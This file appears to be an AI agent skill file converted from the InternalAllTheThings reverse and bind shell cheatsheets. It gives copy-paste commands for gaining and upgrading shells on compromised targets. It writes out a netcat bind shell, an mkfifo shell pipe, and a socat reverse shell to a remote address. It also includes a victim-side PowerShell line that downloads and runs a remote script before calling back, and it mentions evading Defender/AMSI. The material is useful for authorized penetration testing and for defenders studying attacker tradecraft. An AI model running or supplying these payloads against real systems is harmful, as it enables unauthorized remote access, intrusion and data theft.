---
name: shell-cheatsheets
description: >-
  Ready-to-use reverse shell and bind shell payloads across Bash, Python, Perl, PHP, Ruby, Netcat,
  PowerShell, Java, Node, Go and more, plus TTY upgrade and fully interactive Windows shell
  techniques. Use when you need a shell payload for a specific language or listener, when a
  payload must match a restricted environment, or when upgrading a dumb shell to a fully
  interactive one.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "2"
  generated-by: build/build.py
---

# Reverse and Bind Shell Cheatsheets

Copy-paste shell payloads for every common interpreter and listener, plus the steps that turn a
dumb pipe into a usable interactive TTY. Use it when you have code execution (or an injection
point) and need a shell, or when you have a shell that is unusable and need to upgrade it.

## When to use this skill

- You have RCE, LFI or command injection and need an interactive shell.
- Egress filtering blocks reverse connections and you need a bind shell instead.
- The target only has a specific interpreter (php, perl, ruby, lua, python2/3, node, java) and you need a matching payload.
- Windows target: PowerShell/ncat/powercat, or a fully interactive ConPty shell.
- You have a shell but no job control, no arrow keys, and `su`/`sudo` refuses to run (needs a TTY).

## First moves

1. **Start the listener before the payload**, with line editing:
   ```bash
   rlwrap -r nc -lvnp 4444
   ```
   `rlwrap` gives history and arrow keys; without it every typo is permanent.
2. **Pick the payload for the interpreter you confirmed on the target**, not the one you prefer.
3. **Upgrade to a TTY as soon as the shell lands**:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
   then background the shell (`CTRL-Z`), run `stty raw -echo` on your host, and return with `fg`.
   If the target has no python, `perl -e 'exec "/bin/sh";'`, `ruby: exec "/bin/sh"` or `/bin/sh -i`
   are the fallbacks.
4. **If outbound is blocked, switch direction** — bind shell on the target:
   ```bash
   nc -nlvp 51337 -e /bin/bash
   ```
5. **Windows**: ConPty gives a real console (Win10 / Server 2019 1809+):
   ```powershell
   # attacker
   stty raw -echo; (stty size; cat) | nc -lvnp 3001
   # victim
   IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
   ```
6. **Full TTY without python**, when socat is available (or upload the static binary):
   ```bash
   socat file:`tty`,raw,echo=0 TCP-L:4242
   # victim
   /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [reverse-shell.md](references/reverse-shell.md) | you need the payload itself, a Meterpreter handler, or a TTY upgrade | bash/python/perl/php/ruby/nc/ncat/socat/powershell/awk/node/java one-liners, `rlwrap` and `stty` upgrades, ConPty on Windows |
| [bind-shell.md](references/bind-shell.md) | the target cannot call back and you need it to listen | perl/python/php/ruby, netcat traditional (`-e`) vs OpenBSD (`mkfifo`), ncat, socat, powercat |

## Workflow

Route by the constraint that decides feasibility:

1. **Direction** — can the target reach you? If yes → reverse shell. If no (egress filtering,
   NAT, one-way trust) → bind shell, and confirm you can reach the listening port.
2. **Interpreter** — enumerate what exists on the target first (`which python3 python perl php
   ruby nc socat`); a payload for a missing binary is wasted time.
3. **Transport** — plain TCP is usually fine; use socat when you need a PTY in one step, or
   upload a static socat binary to a host that lacks it.
4. **Upgrade** — as soon as you have execution, spawn a PTY; many privilege-escalation steps
   (`su`, `sudo -l`, interactive tools) fail in a non-TTY shell.
5. **Windows** — PowerShell one-liners for the first shell, ConPty when you need tab completion,
   `CTRL-C` and full-screen tools.

## Gotchas

- **`-e` is not in every netcat.** OpenBSD netcat has no `-e`: use the `mkfifo` form
  (`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f`) or `ncat`.
- **`/bin/sh` may be dash.** Spawn `bash` explicitly when you need bash features.
- **A reverse shell dies with the network.** Bind shells survive a dropped callback but need
  inbound reachability, which is often filtered.
- **Bind shells are exposed**: anything that can reach the port gets a shell — bind to a
  controlled interface and close it when done.
- **Windows payloads are signatured**: ConPtyShell, powercat and encoded PowerShell are flagged by
  Defender/AMSI; see `redteam-defense-evasion` before delivery.
- **Multi-line payloads break in non-TTY shells.** Prefer the single-line `python -c` / `perl -e`
  form until the PTY is up.

## Authorized use

For authorized engagements only, with explicit permission for the target system.

## Source

Converted from the upstream InternalAllTheThings shell cheatsheets —
https://github.com/swisskyrepo/InternalAllTheThings — see NOTICE.md.
